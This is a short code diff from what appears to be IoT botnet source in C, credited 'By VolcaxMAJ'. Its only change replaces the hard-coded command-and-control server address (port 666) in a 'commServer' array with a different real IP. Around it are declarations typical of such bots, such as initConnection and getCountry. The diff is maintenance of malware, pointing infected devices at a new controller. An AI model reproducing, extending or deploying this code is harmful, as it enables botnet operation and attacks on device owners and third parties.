@@ -47,7 +47,7 @@ By VolcaxMAJ
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <pthread.h>
-unsigned char *commServer[] = {"95.141.44.217:666"};
+unsigned char *commServer[] = {"173.82.206.9:666"};
 int initConnection();
 int getCountry(unsigned char *buf, int bufsize);
 void makeRandomStr(unsigned char *buf, int length);
